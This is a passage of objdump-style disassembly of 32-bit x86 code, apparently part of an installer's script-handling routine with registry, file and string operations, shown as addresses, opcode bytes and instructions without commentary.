  4024e4:	89 45 08             	mov    %eax,0x8(%ebp)
  4024e7:	0f 84 69 07 00 00    	je     0x402c56
  4024ed:	33 c0                	xor    %eax,%eax
  4024ef:	83 fe 01             	cmp    $0x1,%esi
  4024f2:	bf c8 b5 40 00       	mov    $0x40b5c8,%edi
  4024f7:	75 11                	jne    0x40250a
  4024f9:	6a 23                	push   $0x23
  4024fb:	e8 d2 08 00 00       	call   0x402dd2
  402500:	57                   	push   %edi
  402501:	e8 8c 40 00 00       	call   0x406592
  402506:	8d 44 00 02          	lea    0x2(%eax,%eax,1),%eax
  40250a:	83 fe 04             	cmp    $0x4,%esi
  40250d:	75 12                	jne    0x402521
  40250f:	6a 03                	push   $0x3
  402511:	e8 9a 08 00 00       	call   0x402db0
  402516:	59                   	pop    %ecx
  402517:	a3 c8 b5 40 00       	mov    %eax,0x40b5c8
  40251c:	56                   	push   %esi
  40251d:	89 55 c8             	mov    %edx,-0x38(%ebp)
  402520:	58                   	pop    %eax
  402521:	83 fe 03             	cmp    $0x3,%esi
  402524:	75 0f                	jne    0x402535
  402526:	68 00 18 00 00       	push   $0x1800
  40252b:	57                   	push   %edi
  40252c:	53                   	push   %ebx
  40252d:	ff 75 dc             	push   -0x24(%ebp)
  402530:	e8 df 0d 00 00       	call   0x403314
  402535:	50                   	push   %eax
  402536:	57                   	push   %edi
  402537:	ff 75 f0             	push   -0x10(%ebp)
  40253a:	53                   	push   %ebx
  40253b:	ff 75 bc             	push   -0x44(%ebp)
  40253e:	ff 75 08             	push   0x8(%ebp)
  402541:	ff 15 0c 80 40 00    	call   *0x40800c
  402547:	85 c0                	test   %eax,%eax
  402549:	75 03                	jne    0x40254e
  40254b:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  40254e:	ff 75 08             	push   0x8(%ebp)
  402551:	e9 d3 00 00 00       	jmp    0x402629
  402556:	68 19 00 02 00       	push   $0x20019
  40255b:	e8 b2 08 00 00       	call   0x402e12
  402560:	6a 33                	push   $0x33
  402562:	8b f0                	mov    %eax,%esi
  402564:	e8 69 08 00 00       	call   0x402dd2
  402569:	3b f3                	cmp    %ebx,%esi
  40256b:	66 89 1f             	mov    %bx,(%edi)
  40256e:	0f 84 e6 03 00 00    	je     0x40295a
  402574:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  402577:	c7 45 f0 00 08 00 00 	movl   $0x800,-0x10(%ebp)
  40257e:	51                   	push   %ecx
  40257f:	8d 4d 08             	lea    0x8(%ebp),%ecx
  402582:	57                   	push   %edi
  402583:	51                   	push   %ecx
  402584:	53                   	push   %ebx
  402585:	50                   	push   %eax
  402586:	56                   	push   %esi
  402587:	ff 15 08 80 40 00    	call   *0x408008
  40258d:	33 c9                	xor    %ecx,%ecx
  40258f:	41                   	inc    %ecx
  402590:	85 c0                	test   %eax,%eax
  402592:	75 2e                	jne    0x4025c2
  402594:	83 7d 08 04          	cmpl   $0x4,0x8(%ebp)
  402598:	74 13                	je     0x4025ad
  40259a:	39 4d 08             	cmp    %ecx,0x8(%ebp)
  40259d:	74 06                	je     0x4025a5
  40259f:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
  4025a3:	75 1d                	jne    0x4025c2
  4025a5:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4025a8:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4025ab:	eb 74                	jmp    0x402621
  4025ad:	ff 37                	push   (%edi)
  4025af:	33 c0                	xor    %eax,%eax
  4025b1:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  4025b4:	57                   	push   %edi
  4025b5:	0f 94 c0             	sete   %al
  4025b8:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4025bb:	e8 03 3f 00 00       	call   0x4064c3
  4025c0:	eb 66                	jmp    0x402628
  4025c2:	66 89 1f             	mov    %bx,(%edi)
  4025c5:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  4025c8:	eb 5e                	jmp    0x402628
  4025ca:	68 19 00 02 00       	push   $0x20019
  4025cf:	e8 3e 08 00 00       	call   0x402e12
  4025d4:	6a 03                	push   $0x3
  4025d6:	8b f0                	mov    %eax,%esi
  4025d8:	e8 d3 07 00 00       	call   0x402db0
  4025dd:	3b f3                	cmp    %ebx,%esi
  4025df:	59                   	pop    %ecx
  4025e0:	89 55 f0             	mov    %edx,-0x10(%ebp)
  4025e3:	66 89 1f             	mov    %bx,(%edi)
  4025e6:	0f 84 6e 03 00 00    	je     0x40295a
  4025ec:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  4025ef:	b9 ff 03 00 00       	mov    $0x3ff,%ecx
  4025f4:	89 4d 08             	mov    %ecx,0x8(%ebp)
  4025f7:	74 0c                	je     0x402605
  4025f9:	51                   	push   %ecx
  4025fa:	57                   	push   %edi
  4025fb:	50                   	push   %eax
  4025fc:	56                   	push   %esi
  4025fd:	ff 15 04 80 40 00    	call   *0x408004
  402603:	eb 1c                	jmp    0x402621
  402605:	53                   	push   %ebx
  402606:	53                   	push   %ebx
  402607:	53                   	push   %ebx
  402608:	8d 4d 08             	lea    0x8(%ebp),%ecx
  40260b:	53                   	push   %ebx
  40260c:	51                   	push   %ecx
  40260d:	57                   	push   %edi
  40260e:	50                   	push   %eax
  40260f:	56                   	push   %esi
  402610:	ff 15 00 80 40 00    	call   *0x408000
  402616:	85 c0                	test   %eax,%eax
  402618:	74 07                	je     0x402621
  40261a:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402621:	66 89 9f fe 07 00 00 	mov    %bx,0x7fe(%edi)
  402628:	56                   	push   %esi
  402629:	ff 15 10 80 40 00    	call   *0x408010
  40262f:	e9 22 06 00 00       	jmp    0x402c56
  402634:	57                   	push   %edi
  402635:	e8 a2 3e 00 00       	call   0x4064dc
  40263a:	3b c3                	cmp    %ebx,%eax
  40263c:	0f 84 14 06 00 00    	je     0x402c56
  402642:	50                   	push   %eax
  402643:	e9 cf f9 ff ff       	jmp    0x402017
  402648:	6a ed                	push   $0xffffffed
  40264a:	e8 83 07 00 00       	call   0x402dd2
  40264f:	ff 75 d8             	push   -0x28(%ebp)
  402652:	ff 75 d4             	push   -0x2c(%ebp)
  402655:	50                   	push   %eax
  402656:	e8 11 3a 00 00       	call   0x40606c
  40265b:	83 f8 ff             	cmp    $0xffffffff,%eax
  40265e:	0f 84 f3 02 00 00    	je     0x402957
  402664:	50                   	push   %eax
  402665:	e9 28 ef ff ff       	jmp    0x401592
  40266a:	8b 45 d8             	mov    -0x28(%ebp),%eax
  40266d:	33 c9                	xor    %ecx,%ecx
  40266f:	83 fa 38             	cmp    $0x38,%edx
  402672:	89 45 f0             	mov    %eax,-0x10(%ebp)
  402675:	0f 94 c1             	sete   %cl
  402678:	3b c3                	cmp    %ebx,%eax
  40267a:	8b f1                	mov    %ecx,%esi
  40267c:	74 1b                	je     0x402699
  40267e:	6a 01                	push   $0x1
  402680:	e8 2b 07 00 00       	call   0x402db0
  402685:	66 a3 c8 ad 40 00    	mov    %ax,0x40adc8
  40268b:	33 c0                	xor    %eax,%eax
  40268d:	3b f3                	cmp    %ebx,%esi
  40268f:	59                   	pop    %ecx
  402690:	0f 94 c0             	sete   %al
  402693:	89 55 bc             	mov    %edx,-0x44(%ebp)
  402696:	40                   	inc    %eax
  402697:	eb 3f                	jmp    0x4026d8
  402699:	83 fa 38             	cmp    $0x38,%edx
  40269c:	75 2b                	jne    0x4026c9
  40269e:	6a 21                	push   $0x21
  4026a0:	e8 2d 07 00 00       	call   0x402dd2
  4026a5:	68 00 04 00 00       	push   $0x400
  4026aa:	68 c8 ad 40 00       	push   $0x40adc8
  4026af:	68 c8 b5 40 00       	push   $0x40b5c8
  4026b4:	e8 e5 3e 00 00       	call   0x40659e
  4026b9:	83 c4 0c             	add    $0xc,%esp
  4026bc:	68 c8 ad 40 00       	push   $0x40adc8
  4026c1:	ff 15 28 81 40 00    	call   *0x408128
  4026c7:	eb 0f                	jmp    0x4026d8
  4026c9:	6a 11                	push   $0x11
  4026cb:	e8 02 07 00 00       	call   0x402dd2
  4026d0:	50                   	push   %eax
  4026d1:	e8 bc 3e 00 00       	call   0x406592
  4026d6:	03 c0                	add    %eax,%eax
  4026d8:	66 39 1f             	cmp    %bx,(%edi)
  4026db:	89 45 08             	mov    %eax,0x8(%ebp)
  4026de:	0f 84 76 02 00 00    	je     0x40295a
  4026e4:	57                   	push   %edi
  4026e5:	e8 f2 3d 00 00       	call   0x4064dc
  4026ea:	0b 75 f0             	or     -0x10(%ebp),%esi
  4026ed:	8b f8                	mov    %eax,%edi
  4026ef:	75 14                	jne    0x402705
  4026f1:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  4026f4:	74 0f                	je     0x402705
  4026f6:	57                   	push   %edi
  4026f7:	57                   	push   %edi
  4026f8:	e8 50 3a 00 00       	call   0x40614d
  4026fd:	85 c0                	test   %eax,%eax
  4026ff:	0f 8c 55 02 00 00    	jl     0x40295a
  402705:	ff 75 08             	push   0x8(%ebp)
  402708:	68 c8 ad 40 00       	push   $0x40adc8
  40270d:	57                   	push   %edi
  40270e:	e8 0b 3a 00 00       	call   0x40611e
  402713:	e9 c1 ee ff ff       	jmp    0x4015d9
  402718:	6a 02                	push   $0x2
  40271a:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  40271d:	58                   	pop    %eax
  40271e:	50                   	push   %eax
  40271f:	89 45 b4             	mov    %eax,-0x4c(%ebp)
  402722:	e8 89 06 00 00       	call   0x402db0
  402727:	83 f8 01             	cmp    $0x1,%eax
  40272a:	59                   	pop    %ecx
  40272b:	89 55 f0             	mov    %edx,-0x10(%ebp)
  40272e:	89 45 bc             	mov    %eax,-0x44(%ebp)
  402731:	0f 8c 1f 05 00 00    	jl     0x402c56
  402737:	b9 ff 03 00 00       	mov    $0x3ff,%ecx
  40273c:	3b c1                	cmp    %ecx,%eax
  40273e:	7e 03                	jle    0x402743
  402740:	89 4d bc             	mov    %ecx,-0x44(%ebp)
  402743:	66 39 1f             	cmp    %bx,(%edi)
  402746:	0f 84 5e 01 00 00    	je     0x4028aa
  40274c:	57                   	push   %edi
  40274d:	89 5d c8             	mov    %ebx,-0x38(%ebp)
  402750:	e8 87 3d 00 00       	call   0x4064dc
  402755:	39 5d bc             	cmp    %ebx,-0x44(%ebp)
  402758:	89 45 e8             	mov    %eax,-0x18(%ebp)
  40275b:	0f 8e 49 01 00 00    	jle    0x4028aa
  402761:	8b 35 2c 81 40 00    	mov    0x40812c,%esi
  402767:	83 7d cc 39          	cmpl   $0x39,-0x34(%ebp)
  40276b:	0f 85 8f 00 00 00    	jne    0x402800
  402771:	8d 45 c0             	lea    -0x40(%ebp),%eax
  402774:	53                   	push   %ebx
  402775:	50                   	push   %eax
  402776:	6a 02                	push   $0x2
  402778:	58                   	pop    %eax
  402779:	2b 45 dc             	sub    -0x24(%ebp),%eax
  40277c:	50                   	push   %eax
  40277d:	8d 45 0a             	lea    0xa(%ebp),%eax
  402780:	50                   	push   %eax
  402781:	ff 75 e8             	push   -0x18(%ebp)
  402784:	ff 15 30 81 40 00    	call   *0x408130
  40278a:	85 c0                	test   %eax,%eax
  40278c:	0f 84 18 01 00 00    	je     0x4028aa
  402792:	8b 4d c0             	mov    -0x40(%ebp),%ecx
  402795:	3b cb                	cmp    %ebx,%ecx
  402797:	0f 84 0d 01 00 00    	je     0x4028aa
  40279d:	66 0f b6 45 0a       	movzbw 0xa(%ebp),%ax
  4027a2:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  4027a5:	89 4d b4             	mov    %ecx,-0x4c(%ebp)
  4027a8:	89 45 b0             	mov    %eax,-0x50(%ebp)
  4027ab:	0f 85 b5 00 00 00    	jne    0x402866
  4027b1:	8d 45 b0             	lea    -0x50(%ebp),%eax
  4027b4:	6a 01                	push   $0x1
  4027b6:	50                   	push   %eax
  4027b7:	8d 45 0a             	lea    0xa(%ebp),%eax
  4027ba:	51                   	push   %ecx
  4027bb:	50                   	push   %eax
  4027bc:	6a 08                	push   $0x8
  4027be:	53                   	push   %ebx
  4027bf:	ff d6                	call   *%esi
  4027c1:	85 c0                	test   %eax,%eax
  4027c3:	75 68                	jne    0x40282d
  4027c5:	8b 7d b4             	mov    -0x4c(%ebp),%edi
  4027c8:	f7 df                	neg    %edi
  4027ca:	ff 4d c0             	decl   -0x40(%ebp)
  4027cd:	b8 fd ff 00 00       	mov    $0xfffd,%eax
  4027d2:	89 45 b0             	mov    %eax,-0x50(%ebp)
  4027d5:	74 59                	je     0x402830
  4027d7:	ff 4d b4             	decl   -0x4c(%ebp)
  4027da:	47                   	inc    %edi
  4027db:	6a 01                	push   $0x1
  4027dd:	53                   	push   %ebx
  4027de:	57                   	push   %edi
  4027df:	ff 75 e8             	push   -0x18(%ebp)
  4027e2:	ff 15 34 81 40 00    	call   *0x408134
  4027e8:	8d 45 b0             	lea    -0x50(%ebp),%eax
  4027eb:	6a 01                	push   $0x1
  4027ed:	50                   	push   %eax
  4027ee:	8d 45 0a             	lea    0xa(%ebp),%eax
  4027f1:	ff 75 c0             	push   -0x40(%ebp)
  4027f4:	50                   	push   %eax
  4027f5:	6a 08                	push   $0x8
  4027f7:	53                   	push   %ebx
  4027f8:	ff d6                	call   *%esi
  4027fa:	85 c0                	test   %eax,%eax
  4027fc:	74 cc                	je     0x4027ca
  4027fe:	eb 2d                	jmp    0x40282d
  402800:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  402803:	75 16                	jne    0x40281b
  402805:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  402808:	75 11                	jne    0x40281b
  40280a:	53                   	push   %ebx
  40280b:	ff 75 e8             	push   -0x18(%ebp)
  40280e:	e8 3a 39 00 00       	call   0x40614d
  402813:	85 c0                	test   %eax,%eax
  402815:	0f 8c 8f 00 00 00    	jl     0x4028aa
  40281b:	8d 45 b0             	lea    -0x50(%ebp),%eax
  40281e:	6a 02                	push   $0x2
  402820:	50                   	push   %eax
  402821:	ff 75 e8             	push   -0x18(%ebp)
  402824:	e8 c6 38 00 00       	call   0x4060ef
  402829:	85 c0                	test   %eax,%eax
  40282b:	74 7d                	je     0x4028aa
  40282d:	8b 45 b0             	mov    -0x50(%ebp),%eax
  402830:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  402833:	75 31                	jne    0x402866
  402835:	66 83 7d c8 0d       	cmpw   $0xd,-0x38(%ebp)
  40283a:	74 3b                	je     0x402877
  40283c:	66 83 7d c8 0a       	cmpw   $0xa,-0x38(%ebp)
  402841:	74 34                	je     0x402877
  402843:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  402846:	8b 55 f8             	mov    -0x8(%ebp),%edx
  402849:	ff 45 f8             	incl   -0x8(%ebp)
  40284c:	66 3b c3             	cmp    %bx,%ax
  40284f:	66 89 04 51          	mov    %ax,(%ecx,%edx,2)
  402853:	89 45 c8             	mov    %eax,-0x38(%ebp)
  402856:	74 52                	je     0x4028aa
  402858:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40285b:	3b 45 bc             	cmp    -0x44(%ebp),%eax
  40285e:	0f 8c 03 ff ff ff    	jl     0x402767
  402864:	eb 44                	jmp    0x4028aa
  402866:	0f b7 c0             	movzwl %ax,%eax
  402869:	50                   	push   %eax
  40286a:	ff 75 f4             	push   -0xc(%ebp)
  40286d:	e8 51 3c 00 00       	call   0x4064c3
  402872:	e9 e8 03 00 00       	jmp    0x402c5f
  402877:	66 39 45 c8          	cmp    %ax,-0x38(%ebp)
  40287b:	74 1b                	je     0x402898
  40287d:	66 3d 0d 00          	cmp    $0xd,%ax
  402881:	74 06                	je     0x402889
  402883:	66 3d 0a 00          	cmp    $0xa,%ax
  402887:	75 0f                	jne    0x402898
  402889:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40288c:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40288f:	ff 45 f8             	incl   -0x8(%ebp)
  402892:	66 89 04 51          	mov    %ax,(%ecx,%edx,2)
  402896:	eb 12                	jmp    0x4028aa
  402898:	8b 45 b4             	mov    -0x4c(%ebp),%eax
  40289b:	6a 01                	push   $0x1
  40289d:	f7 d8                	neg    %eax
  40289f:	53                   	push   %ebx
  4028a0:	50                   	push   %eax
  4028a1:	ff 75 e8             	push   -0x18(%ebp)
  4028a4:	ff 15 34 81 40 00    	call   *0x408134
  4028aa:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4028ad:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4028b0:	3b c3                	cmp    %ebx,%eax
  4028b2:	66 89 1c 41          	mov    %bx,(%ecx,%eax,2)
  4028b6:	e9 20 ed ff ff       	jmp    0x4015db
  4028bb:	66 39 1f             	cmp    %bx,(%edi)
  4028be:	0f 84 92 03 00 00    	je     0x402c56
  4028c4:	6a 02                	push   $0x2
  4028c6:	e8 e5 04 00 00       	call   0x402db0
  4028cb:	59                   	pop    %ecx
  4028cc:	89 55 f0             	mov    %edx,-0x10(%ebp)
  4028cf:	ff 75 dc             	push   -0x24(%ebp)
  4028d2:	53                   	push   %ebx
  4028d3:	50                   	push   %eax
  4028d4:	57                   	push   %edi
  4028d5:	e8 02 3c 00 00       	call   0x4064dc
  4028da:	50                   	push   %eax
  4028db:	ff 15 34 81 40 00    	call   *0x408134
  4028e1:	39 5d d4             	cmp    %ebx,-0x2c(%ebp)
  4028e4:	0f 8c 6c 03 00 00    	jl     0x402c56
  4028ea:	50                   	push   %eax
  4028eb:	e9 dd 02 00 00       	jmp    0x402bcd
  4028f0:	57                   	push   %edi
  4028f1:	e8 e6 3b 00 00       	call   0x4064dc
  4028f6:	3b c3                	cmp    %ebx,%eax
  4028f8:	0f 84 58 03 00 00    	je     0x402c56
  4028fe:	50                   	push   %eax
  4028ff:	ff 15 38 81 40 00    	call   *0x408138
  402905:	e9 4c 03 00 00       	jmp    0x402c56
  40290a:	ff 75 f4             	push   -0xc(%ebp)
  40290d:	e8 ca 3b 00 00       	call   0x4064dc
  402912:	3b c3                	cmp    %ebx,%eax
  402914:	74 12                	je     0x402928
  402916:	8d 8d 24 fd ff ff    	lea    -0x2dc(%ebp),%ecx
  40291c:	51                   	push   %ecx
  40291d:	50                   	push   %eax
  40291e:	ff 15 3c 81 40 00    	call   *0x40813c
  402924:	85 c0                	test   %eax,%eax
  402926:	75 47                	jne    0x40296f
  402928:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40292f:	66 89 1f             	mov    %bx,(%edi)
  402932:	e9 1f 03 00 00       	jmp    0x402c56
  402937:	6a 02                	push   $0x2
  402939:	e8 94 04 00 00       	call   0x402dd2
  40293e:	8d 8d 24 fd ff ff    	lea    -0x2dc(%ebp),%ecx
  402944:	51                   	push   %ecx
  402945:	50                   	push   %eax
  402946:	ff 15 40 81 40 00    	call   *0x408140
  40294c:	83 f8 ff             	cmp    $0xffffffff,%eax
  40294f:	75 15                	jne    0x402966
  402951:	8b 45 f4             	mov    -0xc(%ebp),%eax
  402954:	66 89 18             	mov    %bx,(%eax)
  402957:	66 89 1f             	mov    %bx,(%edi)
  40295a:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402961:	e9 f0 02 00 00       	jmp    0x402c56
  402966:	50                   	push   %eax
  402967:	ff 75 f4             	push   -0xc(%ebp)
  40296a:	e8 54 3b 00 00       	call   0x4064c3
  40296f:	8d 85 50 fd ff ff    	lea    -0x2b0(%ebp),%eax
  402975:	50                   	push   %eax
  402976:	57                   	push   %edi
  402977:	e9 44 01 00 00       	jmp    0x402ac0
  40297c:	6a f0                	push   $0xfffffff0
  40297e:	bf 66 fd ff ff       	mov    $0xfffffd66,%edi
  402983:	e8 4a 04 00 00       	call   0x402dd2
  402988:	8b f0                	mov    %eax,%esi
  40298a:	56                   	push   %esi
  40298b:	89 75 c0             	mov    %esi,-0x40(%ebp)
  40298e:	e8 2f 35 00 00       	call   0x405ec2
  402993:	85 c0                	test   %eax,%eax
  402995:	75 07                	jne    0x40299e
  402997:	6a ed                	push   $0xffffffed
  402999:	e8 34 04 00 00       	call   0x402dd2
  40299e:	56                   	push   %esi
  40299f:	e8 a3 36 00 00       	call   0x406047
  4029a4:	6a 02                	push   $0x2
  4029a6:	68 00 00 00 40       	push   $0x40000000
  4029ab:	56                   	push   %esi
  4029ac:	e8 bb 36 00 00       	call   0x40606c
  4029b1:	83 f8 ff             	cmp    $0xffffffff,%eax
  4029b4:	89 45 08             	mov    %eax,0x8(%ebp)
  4029b7:	0f 84 aa 00 00 00    	je     0x402a67
  4029bd:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  4029c0:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  4029c3:	89 45 c8             	mov    %eax,-0x38(%ebp)
  4029c6:	0f 84 83 00 00 00    	je     0x402a4f
  4029cc:	a1 34 9a 42 00       	mov    0x429a34,%eax
  4029d1:	8b 35 10 81 40 00    	mov    0x408110,%esi
  4029d7:	50                   	push   %eax
  4029d8:	6a 40                	push   $0x40
  4029da:	89 45 bc             	mov    %eax,-0x44(%ebp)
  4029dd:	ff d6                	call   *%esi
  4029df:	8b f8                	mov    %eax,%edi
  4029e1:	3b fb                	cmp    %ebx,%edi
  4029e3:	74 6a                	je     0x402a4f
  4029e5:	53                   	push   %ebx
  4029e6:	e8 24 0b 00 00       	call   0x40350f
  4029eb:	ff 75 bc             	push   -0x44(%ebp)
  4029ee:	57                   	push   %edi
  4029ef:	e8 05 0b 00 00       	call   0x4034f9
  4029f4:	ff 75 d8             	push   -0x28(%ebp)
  4029f7:	6a 40                	push   $0x40
  4029f9:	ff d6                	call   *%esi
  4029fb:	8b f0                	mov    %eax,%esi
  4029fd:	3b f3                	cmp    %ebx,%esi
  4029ff:	89 75 f0             	mov    %esi,-0x10(%ebp)
  402a02:	74 34                	je     0x402a38
  402a04:	ff 75 d8             	push   -0x28(%ebp)
  402a07:	56                   	push   %esi
  402a08:	53                   	push   %ebx
  402a09:	ff 75 d4             	push   -0x2c(%ebp)
  402a0c:	e8 03 09 00 00       	call   0x403314
  402a11:	eb 18                	jmp    0x402a2b
  402a13:	8b 0e                	mov    (%esi),%ecx
  402a15:	8b 46 04             	mov    0x4(%esi),%eax
  402a18:	83 c6 08             	add    $0x8,%esi
  402a1b:	51                   	push   %ecx
  402a1c:	03 c7                	add    %edi,%eax
  402a1e:	56                   	push   %esi
  402a1f:	50                   	push   %eax
  402a20:	89 4d c4             	mov    %ecx,-0x3c(%ebp)
  402a23:	e8 ff 35 00 00       	call   0x406027
  402a28:	03 75 c4             	add    -0x3c(%ebp),%esi
  402a2b:	38 1e                	cmp    %bl,(%esi)
  402a2d:	75 e4                	jne    0x402a13
  402a2f:	ff 75 f0             	push   -0x10(%ebp)
  402a32:	ff 15 0c 81 40 00    	call   *0x40810c
  402a38:	ff 75 bc             	push   -0x44(%ebp)
  402a3b:	57                   	push   %edi
  402a3c:	ff 75 08             	push   0x8(%ebp)
  402a3f:	e8 da 36 00 00       	call   0x40611e
  402a44:	57                   	push   %edi
  402a45:	ff 15 0c 81 40 00    	call   *0x40810c
  402a4b:	83 4d c8 ff          	orl    $0xffffffff,-0x38(%ebp)
  402a4f:	53                   	push   %ebx
  402a50:	53                   	push   %ebx
  402a51:	ff 75 08             	push   0x8(%ebp)
  402a54:	ff 75 c8             	push   -0x38(%ebp)
  402a57:	e8 b8 08 00 00       	call   0x403314
  402a5c:	ff 75 08             	push   0x8(%ebp)
  402a5f:	8b f8                	mov    %eax,%edi
  402a61:	ff 15 fc 80 40 00    	call   *0x4080fc
  402a67:	6a f3                	push   $0xfffffff3
  402a69:	3b fb                	cmp    %ebx,%edi
  402a6b:	5e                   	pop    %esi
  402a6c:	7d 13                	jge    0x402a81
  402a6e:	6a ef                	push   $0xffffffef
  402a70:	5e                   	pop    %esi
  402a71:	ff 75 c0             	push   -0x40(%ebp)
  402a74:	ff 15 44 81 40 00    	call   *0x408144
  402a7a:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402a81:	56                   	push   %esi
  402a82:	e9 96 f8 ff ff       	jmp    0x40231d
  402a87:	53                   	push   %ebx
  402a88:	e8 23 03 00 00       	call   0x402db0
  402a8d:	8b f8                	mov    %eax,%edi
  402a8f:	59                   	pop    %ecx
  402a90:	3b 3d 4c 9a 42 00    	cmp    0x429a4c,%edi
  402a96:	89 55 f0             	mov    %edx,-0x10(%ebp)
  402a99:	0f 83 bb fe ff ff    	jae    0x40295a
  402a9f:	8b f7                	mov    %edi,%esi
  402aa1:	8b 45 d8             	mov    -0x28(%ebp),%eax
  402aa4:	69 f6 18 08 00 00    	imul   $0x818,%esi,%esi
  402aaa:	03 35 48 9a 42 00    	add    0x429a48,%esi
  402ab0:	3b c3                	cmp    %ebx,%eax
  402ab2:	7c 1c                	jl     0x402ad0
  402ab4:	8b 0c 86             	mov    (%esi,%eax,4),%ecx
  402ab7:	75 11                	jne    0x402aca
  402ab9:	83 c6 18             	add    $0x18,%esi
  402abc:	56                   	push   %esi
  402abd:	ff 75 f4             	push   -0xc(%ebp)
  402ac0:	e8 b7 3a 00 00       	call   0x40657c
  402ac5:	e9 8c 01 00 00       	jmp    0x402c56
  402aca:	51                   	push   %ecx
  402acb:	e9 fd 00 00 00       	jmp    0x402bcd
  402ad0:	83 c9 ff             	or     $0xffffffff,%ecx
  402ad3:	2b c8                	sub    %eax,%ecx
  402ad5:	89 4d d8             	mov    %ecx,-0x28(%ebp)
  402ad8:	74 10                	je     0x402aea
  402ada:	6a 01                	push   $0x1
  402adc:	e8 cf 02 00 00       	call   0x402db0
  402ae1:	59                   	pop    %ecx
  402ae2:	89 55 f0             	mov    %edx,-0x10(%ebp)
  402ae5:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  402ae8:	eb 10                	jmp    0x402afa
  402aea:	ff 75 e0             	push   -0x20(%ebp)
  402aed:	8d 46 18             	lea    0x18(%esi),%eax
  402af0:	50                   	push   %eax
  402af1:	e8 c3 3a 00 00       	call   0x4065b9
  402af6:	80 4e 09 01          	orb    $0x1,0x9(%esi)
  402afa:	8b 45 d8             	mov    -0x28(%ebp),%eax
  402afd:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  402b00:	89 0c 86             	mov    %ecx,(%esi,%eax,4)
  402b03:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  402b06:	0f 84 4a 01 00 00    	je     0x402c56
  402b0c:	57                   	push   %edi
  402b0d:	e8 6b e6 ff ff       	call   0x40117d
  402b12:	e9 3f 01 00 00       	jmp    0x402c56
  402b17:	53                   	push   %ebx
  402b18:	e8 93 02 00 00       	call   0x402db0
  402b1d:	83 f8 20             	cmp    $0x20,%eax
  402b20:	59                   	pop    %ecx
  402b21:	89 55 f0             	mov    %edx,-0x10(%ebp)
  402b24:	0f 83 30 fe ff ff    	jae    0x40295a
  402b2a:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  402b2d:	74 22                	je     0x402b51
  402b2f:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  402b32:	74 12                	je     0x402b46
  402b34:	50                   	push   %eax
  402b35:	e8 5f e7 ff ff       	call   0x401299
  402b3a:	53                   	push   %ebx
  402b3b:	53                   	push   %ebx
  402b3c:	e8 ae e6 ff ff       	call   0x4011ef
  402b41:	e9 10 01 00 00       	jmp    0x402c56
  402b46:	53                   	push   %ebx
  402b47:	e8 96 e7 ff ff       	call   0x4012e2
  402b4c:	e9 99 fd ff ff       	jmp    0x4028ea
  402b51:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  402b54:	74 15                	je     0x402b6b
  402b56:	8b 15 30 9a 42 00    	mov    0x429a30,%edx
  402b5c:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  402b5f:	89 8c 82 94 00 00 00 	mov    %ecx,0x94(%edx,%eax,4)
  402b66:	e9 eb 00 00 00       	jmp    0x402c56
  402b6b:	8b 0d 30 9a 42 00    	mov    0x429a30,%ecx
  402b71:	ff b4 81 94 00 00 00 	push   0x94(%ecx,%eax,4)
  402b78:	ff 75 f4             	push   -0xc(%ebp)
  402b7b:	e8 39 3a 00 00       	call   0x4065b9
  402b80:	e9 d1 00 00 00       	jmp    0x402c56
  402b85:	8b 45 dc             	mov    -0x24(%ebp),%eax
  402b88:	2b c3                	sub    %ebx,%eax
  402b8a:	74 4b                	je     0x402bd7
  402b8c:	48                   	dec    %eax
  402b8d:	0f 85 c3 00 00 00    	jne    0x402c56
  402b93:	6a 02                	push   $0x2
  402b95:	e8 16 02 00 00       	call   0x402db0
  402b9a:	6a 04                	push   $0x4
  402b9c:	8b f0                	mov    %eax,%esi
  402b9e:	89 55 f0             	mov    %edx,-0x10(%ebp)
  402ba1:	e8 0a 02 00 00       	call   0x402db0
  402ba6:	59                   	pop    %ecx
  402ba7:	89 55 f0             	mov    %edx,-0x10(%ebp)
  402baa:	59                   	pop    %ecx
  402bab:	89 5d 08             	mov    %ebx,0x8(%ebp)
  402bae:	0f b6 c8             	movzbl %al,%ecx
  402bb1:	c1 e8 18             	shr    $0x18,%eax
  402bb4:	3b f3                	cmp    %ebx,%esi
  402bb6:	75 05                	jne    0x402bbd
  402bb8:	be a0 9a 42 00       	mov    $0x429aa0,%esi
  402bbd:	03 c6                	add    %esi,%eax
  402bbf:	51                   	push   %ecx
  402bc0:	50                   	push   %eax
  402bc1:	8d 45 08             	lea    0x8(%ebp),%eax
  402bc4:	50                   	push   %eax
  402bc5:	e8 5d 34 00 00       	call   0x406027
  402bca:	ff 75 08             	push   0x8(%ebp)
  402bcd:	ff 75 f4             	push   -0xc(%ebp)
  402bd0:	e8 ee 38 00 00       	call   0x4064c3
  402bd5:	eb 7f                	jmp    0x402c56
  402bd7:	6a 05                	push   $0x5
